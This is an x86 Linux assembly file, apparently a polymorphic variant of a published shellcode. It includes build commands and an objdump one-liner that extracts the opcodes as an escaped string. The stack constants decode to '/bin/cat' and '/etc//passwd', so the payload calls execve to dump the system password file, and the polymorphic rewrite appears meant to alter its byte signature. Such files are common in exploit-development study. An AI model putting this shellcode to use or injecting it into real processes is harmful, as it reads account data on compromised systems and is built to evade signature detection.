; Author :  Alessio Parzian
; Filename: shellcode-571-poly.asm

; compile with:
; 	nasm -f elf32 shellcode-571-poly.asm
;	ld -o shellcode-571-poly shellcode-571-poly.o
; extract shellcode with:
; 	objdump -d shellcode-571-poly|grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-6 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g'

global _start
section .text
	_start:
		mov al, 0xb	
		and eax, 0xF 
		cdq
		mov dword [esp-4], edx
		mov dword [esp-8], 0x7461632f
		mov dword [esp-12], 0x6e69622f
		lea ebx, [esp-12]
		mov dword [esp-16], edx
		mov dword [esp-20], 0x64777373
		mov dword [esp-24], 0x61702f2f
		mov dword [esp-28], 0x6374652f
		lea ecx, [esp-28]
		mov dword [esp-32], edx
		mov dword [esp-36], ecx
		mov dword [esp-40], ebx
		lea ecx, [esp-40]
		int 0x80